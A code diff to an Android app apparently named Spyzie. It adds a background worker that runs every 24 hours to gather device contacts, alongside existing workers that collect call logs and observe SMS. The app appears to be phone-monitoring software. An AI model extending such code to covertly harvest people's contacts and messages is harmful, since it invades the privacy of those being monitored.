@@ -17,6 +17,7 @@ import androidx.work.WorkManager;
 
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.device.worker.GetCallsWorker;
+import com.tantd.spyzie.data.device.worker.GetContactsWorker;
 import com.tantd.spyzie.di.module.ServiceModule;
 import com.tantd.spyzie.receiver.SmsObserver;
 import com.tantd.spyzie.receiver.SpyzieReceiver;
@@ -33,6 +34,7 @@ public class MainService extends Service {
     private SpyzieReceiver mSpyzieReceiver;
 
     private PeriodicWorkRequest mGetCallsWorkRequest;
+    private PeriodicWorkRequest mGetContactsWorkRequest;
 
     @Override
     public void onCreate() {
@@ -66,6 +68,8 @@ public class MainService extends Service {
 
         startGetCallsWorkRequest();
 
+        startGetContactsWorkRequest();
+
         return START_STICKY;
     }
 
@@ -73,6 +77,12 @@ public class MainService extends Service {
         mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, 24, TimeUnit.HOURS).build();
         WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetCallsWorker.GET_CALLS_WORK_REQUEST,
                 ExistingPeriodicWorkPolicy.KEEP, mGetCallsWorkRequest);
+    }
+
+    private void startGetContactsWorkRequest() {
+        mGetContactsWorkRequest = new PeriodicWorkRequest.Builder(GetContactsWorker.class, 24, TimeUnit.HOURS).build();
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetContactsWorker.GET_CONTACTS_WORK_REQUEST,
+                ExistingPeriodicWorkPolicy.KEEP, mGetContactsWorkRequest);
     }
 
     @Override
@@ -89,6 +99,7 @@ public class MainService extends Service {
 
         // TODO: cancel all work requests
         WorkManager.getInstance(this).cancelWorkById(mGetCallsWorkRequest.getId());
+        WorkManager.getInstance(this).cancelWorkById(mGetContactsWorkRequest.getId());
     }
 
     @Nullable
